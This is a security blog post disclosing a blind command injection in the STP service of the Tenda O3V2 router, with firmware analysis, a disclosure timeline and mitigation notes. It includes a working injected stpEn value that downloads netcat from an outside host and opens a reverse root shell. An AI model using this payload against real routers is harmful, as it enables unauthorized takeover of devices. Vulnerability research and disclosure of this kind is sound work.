<!DOCTYPE html> <html lang="en-US"> <head prefix="og: http://ogp.me/ns#"> <meta charset="UTF-8" /> <meta http-equiv="X-UA-Compatible" content="ie=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1.0" /> <meta name="mobile-web-app-capable" content="yes" /> <meta name="apple-mobile-web-app-capable" content="yes" /> <meta name="application-name" content="exzettabyte" /> <meta name="apple-mobile-web-app-status-bar-style" content="#fff" /> <meta name="apple-mobile-web-app-title" content="exzettabyte" /> <title> Blind Command Injection in STP Service on Tenda O3V2 - exzettabyte </title> <link rel="alternate" href="http://localhost:4000/blind-command-injection-in-stp-service-on-tenda-o3v2/" hreflang="en-US" /> <link rel="canonical" href="http://localhost:4000/blind-command-injection-in-stp-service-on-tenda-o3v2/" /> <meta name="description" content="I&#39;m exzettabyte writing in English about cyber security as a journal for documentation things that I learned" /> <meta name="referrer" content="no-referrer-when-downgrade" /> <meta property="fb:app_id" content="" /> <meta property="og:site_name" content="Blind Command Injection in STP Service on Tenda O3V2 | exzettabyte" /> <meta property="og:title" content="Blind Command Injection in STP Service on Tenda O3V2 | exzettabyte" /> <meta property="og:type" content="website" /> <meta property="og:url" content="http://localhost:4000/blind-command-injection-in-stp-service-on-tenda-o3v2/" /> <meta property="og:description" content="I&#39;m exzettabyte writing in English about cyber security as a journal for documentation things that I learned" /> <meta property="og:image" content="http://localhost:4000/assets/img/ogp.png" /> <meta property="og:image:width" content="640" /> <meta property="og:image:height" content="640" /> <meta name="twitter:card" content="summary" /> <meta name="twitter:title" content="Blind Command Injection in STP Service on Tenda O3V2 | " /> <meta name="twitter:url" content="http://localhost:4000/blind-command-injection-in-stp-service-on-tenda-o3v2/" /> <meta name="twitter:site" content="@" /> <meta name="twitter:creator" content="@" /> <meta name="twitter:description" content="I&#39;m exzettabyte writing in English about cyber security as a journal for documentation things that I learned" /> <meta name="twitter:image" content="http://localhost:4000/assets/img/ogp.png" /> <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="exzettabyte" /> <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicons/apple-touch-icon.png" /> <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicons/favicon-32x32.png" /> <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicons/favicon-16x16.png" /> <link rel="manifest" href="/assets/favicons/site.webmanifest" /> <link rel="mask-icon" href="/assets/favicons/safari-pinned-tab.svg" color="#5bbad5" /> <meta name="apple-mobile-web-app-title" content="Jekyll Klise" /> <meta name="application-name" content="Jekyll Klise" /> <meta name="msapplication-TileColor" content="#da532c" /> <meta name="theme-color" content="#2c2c2c" /> <link rel="stylesheet" href="/assets/css/style.css" /> <!-- for mathjax support --> </head> <body data-theme="dark" class="notransition"> <script> const body = document.body; const data = body.getAttribute("data-theme"); const initTheme = (state) => { if (state === "dark") { body.setAttribute("data-theme", "dark"); } else if (state === "light") { body.removeAttribute("data-theme"); } else { localStorage.setItem("theme", data); } }; initTheme(localStorage.getItem("theme")); setTimeout(() => body.classList.remove("notransition"), 75); </script> <div class="navbar" role="navigation"> <nav class="menu"> <input type="checkbox" id="menu-trigger" class="menu-trigger" /> <label for="menu-trigger"> <span class="menu-icon"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <path d="M64,384H448V341.33H64Zm0-106.67H448V234.67H64ZM64,128v42.67H448V128Z" /> </svg> </span> </label> <a id="mode"> <svg class="mode-sunny" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <title>LIGHT</title> <line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> </svg> <svg class="mode-moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <title>DARK</title> <line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> </svg> </a> <div class="trigger"> <div class="trigger-container"><a class="menu-link" href="/">home</a><a class="menu-link" href="/archive/">archive</a><a class="menu-link" href="/about/">about</a></div> </div> </nav> </div> <div class="wrapper post"> <main class="page-content" aria-label="Content"> <article itemscope itemtype="https://schema.org/BlogPosting"> <header class="header"> <div class="tags"> <span itemprop="keywords"> <a class="tag" href="/tags/#research">RESEARCH</a>, <a class="tag" href="/tags/#hardware">HARDWARE</a> </span> </div> <h1 class="header-title" itemprop="headline">Blind Command Injection in STP Service on Tenda O3V2</h1> <div class="post-meta"> <time datetime="2024-05-19T13:30:00+07:00" itemprop="datePublished"> May 19, 2024 </time> <span itemprop="author" itemscope itemtype="https://schema.org/Person"> <span itemprop="name">exzettabyte</span> </span> <time hidden datetime="" itemprop="dateModified"> May 19, 2024 </time> <span hidden itemprop="publisher" itemtype="Person">exzettabyte</span> <span hidden itemprop="image"></span> <span hidden itemprop="mainEntityOfPage"><p>This article discusses the second vulnerability I found in the Tenda O3V2 with firmware version 1.0.0.12. The vulnerability I found was blind command injection on the enable/disable STP Service feature. Blind command injection is a vulnerability that allows an attacker to execute operating system commands on the server that is running an application and application does not return the output from the command. Tenda O3V2 have stp service, by default this service is off, when disable this service will carry a value of 0 and if enable the service will carry a value of 1 on the parameter then enter the dosystemcmd function. Due to the lack of validation on these parameter, blind command injection can occur.</p> </span> </div> </header> <div class="page-content" itemprop="articleBody"> <p>This article discusses the second vulnerability I found in the Tenda O3V2 with firmware version 1.0.0.12. The vulnerability I found was blind command injection on the enable/disable STP Service feature. Blind command injection is a vulnerability that allows an attacker to execute operating system commands on the server that is running an application and application does not return the output from the command. Tenda O3V2 have stp service, by default this service is off, when disable this service will carry a value of 0 and if enable the service will carry a value of 1 on the parameter then enter the dosystemcmd function. Due to the lack of validation on these parameter, blind command injection can occur.</p> <h3 id="vulnerability-analysis"> <a href="#vulnerability-analysis" class="anchor-head"></a> Vulnerability Analysis </h3> <p>Open router’s httpd binary with Ghidra. In the setSTP function there is the doSystemCmd function, this function executes the command that will enable/disable the stp service and this function requires user input. It is evident in the stprequest variable there is no sanitization, this variable will later be passed to the doSystemCmd function, potentially leading to command injection, and because the command is only executed and the result of the command is not displayed, this command injection is blind.</p> <p><img src="/assets/img/blind-command-injection-in-stp-service-on-tenda-o3v2/setstpfunc.png" alt="SetSTP Function" /></p> <p>Listen on port 1337 with nc (netcat), then activate the web server to make the router download the netcat binary (mips). Netcat is used for reverse shell.</p> <p><img src="/assets/img/blind-command-injection-in-stp-service-on-tenda-o3v2/pythonhttpserver.png" alt="Python HTTP Server" /></p> <p>Visit 192.168.2.1 and login, then go to Network Service</p> <p><img src="/assets/img/blind-command-injection-in-stp-service-on-tenda-o3v2/networkservice.png" alt="Network Service" /></p> <p>Intercept request using burpsuite when submit. In the setNetworkService endpoint, there is stpEn parameter.</p> <p><img src="/assets/img/blind-command-injection-in-stp-service-on-tenda-o3v2/interceptrequest.png" alt="Intercept Request" /></p> <p>Change the value of the stpEn parameter to the command we want, for example performing a reverse shell then forward the request<br /></p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">;</span>wget 192.168.2.158:8000/netcat <span class="nt">-O</span> /tmp/netcat&amp;&amp;chmod +x /tmp/netcat&amp;&amp;./tmp/netcat 192.168.2.158 1337 <span class="nt">-e</span> /bin/sh
</code></pre></div></div> <p>Explanation of this command, the router will download the netcat binary stored in the tmp directory, then the binary will be given execute access and then execute the binary to reverse shell to port 1337. Then forward the request.</p> <p><img src="/assets/img/blind-command-injection-in-stp-service-on-tenda-o3v2/revshell.png" alt="Reverse Shell" /></p> <p>Check the web server, and it’s visible that the router is downloading the netcat file</p> <p><img src="/assets/img/blind-command-injection-in-stp-service-on-tenda-o3v2/downloadncmips.png" alt="Download nc MIPS" /></p> <p>Check on the listener, the reverse shell is successful. Now, we got full access to the router with root privilege.</p> <p><img src="/assets/img/blind-command-injection-in-stp-service-on-tenda-o3v2/gotrootshell.png" alt="Got Root Shell" /></p> <h3 id="mitigation"> <a href="#mitigation" class="anchor-head"></a> Mitigation </h3> <p>When this article was published, Tenda had already released new firmware for this device with firmware version 1.0.0.13(5755). In this firmware version, the vulnerability has been fixed by implementing sanitization.</p> <p>They still haven’t released the new firmware to the public but you can download the latest firmware <a href="https://drive.google.com/file/d/1687UGmpNgmPnvOeJtIuDvoEUrDh7VSKZ/view?usp=sharing" target="_blank" rel="noopener noreferrer">here</a></p> <h3 id="timeline"> <a href="#timeline" class="anchor-head"></a> Timeline </h3> <p>20 April 2024: Vulnerability discovered and sent them the details of the vulnerability.<br /> 20 April 2024: Vendor triage the vulnerability.<br /> 22 April 2024: Vendor release new firmware version 1.0.0.13(5755).<br /> 25 April 2024: Retesting on the new firmware version and confirming the vulnerability has been fixed.<br /></p> </div> </article> </main> <nav class="post-nav"> <a class="post-nav-item post-nav-prev" href="/Blind-Command-Injection-in-Tenda-O3V2/" > <div class="nav-arrow">Previous</div> <span class="post-title">CVE-2024-34338 - Blind Command Injection in Traceroute on Tenda O3V2</span> </a> </nav> <footer class="footer"> <span class="footer_item">&copy; 2024</span> <small class="footer_copyright"> <!-- Klisé Theme: https://github.com/piharpi/jekyll-klise --> <a href="https://github.com/piharpi/jekyll-klise" target="_blank" rel="noreferrer noopener" >klisé</a > theme on <a href="https://jekyllrb.com" target="_blank" rel="noreferrer noopener" >jekyll</a > </small> </footer> <script src="/assets/js/main.js" defer="defer"></script> </div> </body> </html>
